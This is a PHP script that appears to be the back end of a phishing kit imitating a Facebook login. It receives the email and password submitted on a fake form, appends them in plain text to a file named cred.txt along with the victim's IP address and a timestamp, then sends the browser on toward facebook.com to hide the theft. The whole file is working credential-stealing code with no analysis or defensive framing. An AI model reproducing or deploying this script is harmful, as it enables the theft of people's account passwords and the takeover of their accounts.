<?php
    function secureInput($value){
        $value = trim($value);
        $value = stripslashes($value);
        $value = htmlspecialchars($value);
        return $value;
    }

    function get_client_ip() {
        $ipaddress = '';
        if (getenv('HTTP_CLIENT_IP'))
            $ipaddress = getenv('HTTP_CLIENT_IP');
        else if(getenv('HTTP_X_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
        else if(getenv('HTTP_X_FORWARDED'))
            $ipaddress = getenv('HTTP_X_FORWARDED');
        else if(getenv('HTTP_FORWARDED_FOR'))
            $ipaddress = getenv('HTTP_FORWARDED_FOR');
        else if(getenv('HTTP_FORWARDED'))
           $ipaddress = getenv('HTTP_FORWARDED');
        else if(getenv('REMOTE_ADDR'))
            $ipaddress = getenv('REMOTE_ADDR');
        else
            $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }

    if($_SERVER["REQUEST_METHOD"] == "POST"){
        if( isset($_POST["email"]) && !empty($_POST["email"]) && isset($_POST["psw"]) && !empty($_POST["psw"])){
            $email = secureInput($_POST["email"]);
            $password = secureInput($_POST["psw"]);
            $file = fopen("cred.txt", "a");
            $ip = get_client_ip();
            $date = date("D M j G:i:s T Y") ;
            $txt = "new user". "    " . $email . "  " . $password . "   " . $date. "    ||   " . $ip . "\n";
            fwrite($file, $txt);
            fclose($file);
	echo '<script>window.location.href  = "facebook.com" ;</script>';
	exit();

        }else{
            header("Location : ../");
            exit();
        }
    }else{
        header("Location : ../");
        exit();
    }
?>